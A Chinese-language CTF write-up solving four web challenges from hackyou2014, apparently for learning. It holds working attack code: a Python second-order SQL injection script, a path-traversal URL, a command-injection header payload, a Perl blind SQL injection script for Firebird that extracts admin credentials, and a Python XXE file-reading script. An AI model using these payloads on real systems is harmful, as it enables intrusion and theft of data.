# hackyou2014 CTF web关卡通关攻略

作者：Mickey,瞌睡龙

所有文件已打包可自己搭建测试：

[CTF.zip](http://static.wooyun.org/20141017/2014101711044119266.zip)

第一关
---

* * *

[http://hackyou2014tasks.ctf.su:10080/](http://hackyou2014tasks.ctf.su:10080/)

打开网页，通过看源代码发现有

```
<!-- TODO: remove index.phps -->

```

尝试访问index.phps，如图1，

![2014012112115741016.png](http://drops.javaweb.org/uploads/images/50391a4c8c38d7bbdae4a355f058e7adb0ea1d58.jpg)

通过查看index.phps,发现源代码如下：

```
<?php
include 'db.php';
session_start();
if (!isset($_SESSION['login'])) {
    $_SESSION['login'] = 'guest'.mt_rand(1e5, 1e6);
}
$login = $_SESSION['login'];

if (isset($_POST['submit'])) {
    if (!isset($_POST['id'], $_POST['vote']) || !is_numeric($_POST['id']))
        die('Hacking attempt!');
    $id = $_POST['id'];
    $vote = (int)$_POST['vote'];
    if ($vote > 5 || $vote < 1)
        $vote = 1;
    $q = mysql_query("INSERT INTO vote VALUES ({$id}, {$vote}, '{$login}')");
    $q = mysql_query("SELECT id FROM vote WHERE user = '{$login}' GROUP BY id");
    echo '<p><b>Thank you!</b> Results:</p>';
    echo '<table border="1">';
    echo '<tr><th>Logo</th><th>Total votes</th><th>Average</th></tr>';
    while ($r = mysql_fetch_array($q)) {
        $arr = mysql_fetch_array(mysql_query("SELECT title FROM picture WHERE id = ".$r['id']));
        echo '<tr><td>'.$arr[0].'</td>';
        $arr = mysql_fetch_array(mysql_query("SELECT COUNT(value), AVG(value) FROM vote WHERE id = ".$r['id']));
        echo '<td>'.$arr[0].'</td><td>'.round($arr[1],2).'</td></tr>';
    }
    echo '</table>';
    echo '<br><a href="index.php">Back</a><br>';
    exit;
}
?>
<html>
<head>
    <title>Picture Gallery</title>
</head>
<body>
<p>Welcome, <?php echo $login; ?></p>
<p>Help us to choose the best logo!</p>
<form action="index.php" method="POST">
<table border="1" cellspacing="5">
<tr>
<?php
$q = mysql_query('SELECT * FROM picture');
while ($r = mysql_fetch_array($q)) {
    echo '<td><img src="./images/'.$r['image'].'"><div align="center">'.$r['title'].'<br><input type="radio" name="id" value="'.$r['id'].'"></div></td>';
}
?>
</tr>
</table>
<p>Your vote:
<select name="vote">
<option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
<option value="5">5</option>
</select></p>
<input type="submit" name="submit" value="Submit">
</form>
</body>
</html>
<!-- TODO: remove index.phps -->

```

其中id是被is_numeric过滤后，插入到vote表里的，可以用十六进制或者二进制绕过is_numeric,把注入查询语句插入到vote表里，然后又从vote表里取出，形成二次注入。

POC如下：

```
#!/usr/bin/env python
import requests
import binascii
import sys

def hack(inject):
    vul={'id':inject,'vote':3,'submit':1}
    req=requests.post('http://hackyou2014tasks.ctf.su:10080/index.php',data=vul)
    print req.content

if __name__=="__main__":
    hack("0x" + binascii.hexlify(sys.argv[1]))

```

效果图如2

![2014012112121549265.png](http://drops.javaweb.org/uploads/images/967be60175fa6eac096273869cd5befc62b73d58.jpg)

第二关
---

* * *

[http://hackyou2014tasks.ctf.su:20080/](http://hackyou2014tasks.ctf.su:20080/)

这关打开后是个贪吃蛇游戏，只有注册用户才能保存结果，我们注册一个用户babybox，玩完游戏后访问后台，发现有个ip参数值得注意，尝试提交

```
http://hackyou2014tasks.ctf.su:20080/cgi-bin/index.pl?ip=../../../../../../var/www/cgi-bin/index.pl

```

发现有LFI，如图3

![2014012112125366530.png](http://drops.javaweb.org/uploads/images/5736028010fc1da0ff93f902eb0d43716a5e9f72.jpg)

通过读取到的index.pl源码可以发现，

```
$login = $session->param('login');
print $req->p('Hello, '.$login.'!');
if ($req->param('ip')) {
    $file = './data/'.MD5($login)."/".$req->param('ip');
    if (-e $file) {
        open FILE, $file;
        $html = '';
        while (<FILE>) {
            $html .= $_;
        }
        close(FILE);
        print $req->start_table({border=>1});
        print $req->Tr($req->th(['Date', 'Score']));
        print $html;
        print $req->end_table();
        print $req->a({href=>'index.pl'}, 'Back');
    } else {
        print $req->h1('Error');
    }
}

```

其中的open函数，可以导致命令执行，下载火狐的X-Forwarded-For Header插件，设置X-Forwarded-For为|pwd|，然后玩游戏，进后台看成绩，提交

```
http://hackyou2014tasks.ctf.su:20080/cgi-bin/index.pl?ip=|pwd|

```

发现命令注入成功了。由于这里不能使用/和\字符，我们可以使用base64编码下，如图4

这之前需要在提交成绩的时候X-Forwarded-For改为

```
|`echo bHMgLw== | base64 -d`|

```

![2014012112130828316.png](http://drops.javaweb.org/uploads/images/fa9b4a6b7f7f38e0538ac11505245a9567db1c25.jpg)

第三关
---

* * *

[http://hackyou2014tasks.ctf.su:30080/](http://hackyou2014tasks.ctf.su:30080/)

这关可分为两部分

```
1、找到隐藏的管理后台
2、盲注获取权限

```

找到隐藏的管理后台需要利用windows平台上的一个技巧，具体的研究测试报告可以看这里：

[Windows+PHP bug realted with findfirstfile](http://onsec.ru/onsec.whitepaper-02.eng.pdf)

php的某些函数获取文件时，可以使用`<`代替其他字符进行猜解。

```
p<<

```

表示

```
p*

```

include_once函数包含文件将会返回以p开头的第一个文件，这里返回了phpinfo()的信息。

可以知道后台的数据库是firebird，如图5，

![2014012112133660316.png](http://drops.javaweb.org/uploads/images/b8895ff76594126f5cb4e50a39d63858843649a0.jpg)

然后猜解后台目录：

```
http://hackyou2014tasks.ctf.su:30080/index.php?page=0<<
http://hackyou2014tasks.ctf.su:30080/index.php?page=0a<<

```

根据页面返回当中是否有

```
Page does not exists

```

字符串，来判断猜解的字符串是否正确。

然后用burpsuite去猜测剩余的字符，全部猜测成功后，发现

```
http://hackyou2014tasks.ctf.su:30080/0a5d2eb35b90e338ed481893af7a6d78/index.php

```

是个后台登陆口，没有账号，继续翻前台，发现

```
http://hackyou2014tasks.ctf.su:30080/index.php?page=shop&order=cost

```

有注入

```
http://hackyou2014tasks.ctf.su:30080/index.php?page=shop&order=cost ASC

```

其实看到order参数，就很容易猜测可能是order by语句后的注入 :)

针对这个场景，firebird数据库，可控语句在order by之后，只能采取盲注：

已有人写好跑数据的perl脚本：

```
use LWP::Simple;
#username:password
#admin:9shS3FAk

# extract columns from USERS

$url="http://hackyou2014tasks.ctf.su:30080/index.php?page=shop&order=";

$fst="case when(1=(select first 1 1 from rdb\$relation_fields where lower(RDB\$RELATION_NAME)=ascii_char(117)||ascii_char(115)||ascii_char(101)||ascii_char(114)||ascii_char(115) and lower(rdb\$field_name) LIKE ";
$snd="||ascii_char(37) )) then (select first 1 1 from rdb\$relations) else (select first 2 1 from rdb\$relations) end";
$b=0;


# LOGIN column part
for($j=0;$j<100;$j++){
for($i=97;$i<122;$i++){
        $sql=$url.$fst."ascii_char(".$i.")".$snd;
        #print "j: ".$j." i:".$i."\n";
        $html=get $sql;
        if ($html=~/1337/ && $i!=37 && $i!=95){
                print chr($i);
                $fst.="ascii_char(".$i.")||";

                last;
        }else{
                $b++;
        }
}
if($b==122-97){
        last;
}else{
$b=0;
}
}
print "\n";

# PASSWD column part
$fst="case when(1=(select first 1 1 from rdb\$relation_fields where lower(RDB\$RELATION_NAME)=ascii_char(117)||ascii_char(115)||ascii_char(101)||ascii_char(114)||ascii_char(115) and lower(rdb\$field_name) LIKE ";
$b=0;
for($j=0;$j<100;$j++){
for($i=97;$i<122;$i++){
        $sql=$url.$fst."ascii_char(".$i.")".$snd;

        $html=get $sql;
        if ($html=~/1337/ && $i!=37 && $i!=95 && $i!=108){
                print chr($i);
                $fst.="ascii_char(".$i.")||";
                last;
        }else{
                $b++;
        }
}
if($b==122-97){
        last;
}else{
$b=0;
}
}
print "\n";

#extract data from USERS ( LOGIN,PASSWD)

$fst="case when(1=(select first 1 1 from USERS where LOGIN LIKE ";
$snd="||ascii_char(37) )) then (select first 1 1 from rdb\$relations) else (select first 2 1 from rdb\$relations) end";
for($j=0;$j<100;$j++){
for($i=65;$i<=122;$i++){
        $sql=$url.$fst."ascii_char(".$i.")".$snd;
        #print $j." ".$i."\n";

        $html=get $sql;
        if ($html=~/1337/ && $i!=37 && $i!=95){
                print chr($i)."\n";
                $fst.="ascii_char(".$i.")||";
                last;
        }else{
                $b++;
        }
}
if($b==123-65){
        last;
}else{
$b=0;
}
}
print "\n";

$fst="case when(1=(select first 1 1 from USERS where PASSWD LIKE ";
$snd="||ascii_char(37) )) then (select first 1 1 from rdb\$relations) else (select first 2 1 from rdb\$relations) end";
for($j=0;$j<100;$j++){
for($i=48;$i<=122;$i++){
        $sql=$url.$fst."ascii_char(".$i.")".$snd;
        #print $j." ".$i."\n";

        $html=get $sql;
        if ($html=~/1337/ && $i!=37 && $i!=95){
                print chr($i)."\n";
                $fst.="ascii_char(".$i.")||";
                last;
        }else{
                $b++;
        }
}
if($b==123-48){
        last;
}else{
$b=0;
}
}
print "\n";

```

最后可以看到数据为：

```
admin
9shS3FAk

```

到登陆页面登陆即可过关。

第四关
---

* * *

这关提供源码下载了，[http://hackyou.ctf.su/files/web400.zip](http://hackyou.ctf.su/files/web400.zip)

```
<?php
include 'config.php';
include 'classes.php';
$action = (isset($_REQUEST['action'])) ? $_REQUEST['action'] : 'View';
$param = (isset($_REQUEST['param'])) ? $_REQUEST['param'] : 'index';
$page = new $action($param);
echo $page;
?>

```

看这行

```
$page = new $action($param);

```

我们能实例化任意的类，并且传递$param给构造函数，我们先拿SimpleXMLElement看看效果

[http://cn2.php.net/manual/en/simplexmlelement.construct.php](http://cn2.php.net/manual/en/simplexmlelement.construct.php)

POC如下：

```
#!/usr/bin/env python
import requests
import sys
import base64

def hack(inject):
    vul={'param':'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "' + inject + '" >]><foo>&xxe;</foo>'}
    req=requests.post('http://hackyou2014tasks.ctf.su:40080/index.php?action=SimpleXMLElement',data=vul)
    print base64.b64decode(req.content)

if __name__=="__main__":
    hack(sys.argv[1])

```

效果如图6:

![2014012112143046600.png](http://drops.javaweb.org/uploads/images/4e09babdbc5f52102d5addb19bc95baac90e9060.jpg)

也可以用SplFileObject

[http://cn2.php.net/manual/en/splfileobject.construct.php](http://cn2.php.net/manual/en/splfileobject.construct.php)

效果图如7:

![2014012112144854244.png](http://drops.javaweb.org/uploads/images/175c7a3abf4a66877b18bd64b25bd4dd9c5640f0.jpg)

最后用GlobIterator得到结果

[http://cn2.php.net/manual/en/globiterator.construct.php](http://cn2.php.net/manual/en/globiterator.construct.php)

效果图如8:

![2014012112150472274.png](http://drops.javaweb.org/uploads/images/ac21f57e3e4d781e02bdfa4e6ef81181884a51c8.jpg)